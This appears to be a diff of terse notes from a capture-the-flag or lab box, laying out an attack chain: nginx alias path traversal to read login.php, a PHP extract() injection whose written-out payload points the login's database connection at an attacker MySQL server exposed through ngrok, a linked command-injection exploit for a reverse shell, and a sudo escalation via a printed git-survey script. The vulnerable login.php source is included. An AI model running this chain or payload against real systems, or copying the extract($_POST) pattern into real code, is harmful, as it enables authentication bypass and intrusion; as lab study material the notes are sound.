@@ -1,0 +1,70 @@
+1.https://www.acunetix.com/vulnerabilities/web/path-traversal-via-misconfigured-nginx-alias/ -- lfi backup.login.php
+2.extractor function manipulat to conect to our server with the right creds to bypass auth 
+2.0 https://www.w3schools.com/php/func_array_extract.asp#:~:text=The%20extract()%20function%20imports,of%20variables%20extracted%20on%20success.
+2.1 setup mysql server
+2.2 exposed it with ngrok
+2.3 connect and bypass 
+    dbName=extractor;mysql:dbname=INFORMATION_SCHEMA;host=2.tcp.eu.ngrok.io;port=11972;charset=GBK&dbUser=root&dbPassword=qwerty123&username=test&password=test
+3. https://github.com/elweth-sec/CVE-2023-2255 -- command inject for reverseshell 
+4. sudo -l --> sudo  /bin/git-survey
+4.1 
+strings /bin/git-survey
+#!/usr/bin/env python3
+from shlex import quote,split
+import sys, subprocess, time
+def menu(help):
+    print("Welcome to git survey v1.0\n")
+    if help:
+        print("Usage: /bin/git-survey https://github.com/Nishacid/WSAAR")
+def survey(url):
+    command = ['git', 'ls-remote']
+    command = command + split(url)
+    subprocess.Popen(command)
+    time.sleep(1)
+if __name__ == '__main__':
+    if len(sys.argv) == 1:
+        menu(True)
+    else:
+        menu(False)
+        survey(sys.argv[1])
+
+
+login.php
+<?php
+session_start();
+header('Content-type: application/json');
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+
+    $dbName = 'extractor';
+    $dbUser = 'root';
+    $dbPassword = 'root';
+
+    extract($_POST);
+
+    try {
+        $pdo = new PDO("mysql:host=db;dbname=$dbName", $dbUser, $dbPassword);
+        $pdo->setAttribute(PDO::ATTR_ERRMODE, PDO::ERRMODE_EXCEPTION);
+
+        $stmt = $pdo->prepare("SELECT * FROM users WHERE username = :username AND pwd = :password");
+        $stmt->bindParam(':username', $username);
+        
+        $hashedPassword = md5($password);
+        $stmt->bindParam(':password', $hashedPassword);
+
+        $stmt->execute();
+
+        if ($stmt->rowCount() > 0) {
+            update_session_cookie();
+            echo json_encode(['success' => true, 'message' => 'Authentication successful.']);
+        } else {
+            echo json_encode(['success' => false, 'message' => 'Username or password incorrect.']);
+        }
+    } catch (PDOException $e) {
+        echo json_encode(['success' => false, 'error' => $e->getMessage()]);
+    }
+} else {
+    header('HTTP/1.1 405 Method Not Allowed');
+    echo 'Method Not Allowed';
+}
+?>
